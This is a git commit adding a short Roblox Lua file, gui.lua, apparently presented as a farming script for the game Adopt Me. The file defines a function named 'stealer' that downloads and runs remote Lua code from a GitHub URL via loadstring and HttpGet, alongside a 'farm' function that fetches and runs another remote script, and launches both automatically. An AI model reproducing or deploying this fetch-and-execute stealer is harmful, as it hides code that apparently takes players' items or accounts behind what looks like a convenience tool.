b677150b908e0be096ecd2c4570600347d3c80de
trabulascript <tipo52808@gmail.com>
2025-03-10 20:34:37 +0100

    Create gui.lua

---
+++ gui.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/trabulascript/adoptme/refs/heads/main/script.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/BalordaNostalgia/deses/refs/heads/main/adoptme.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
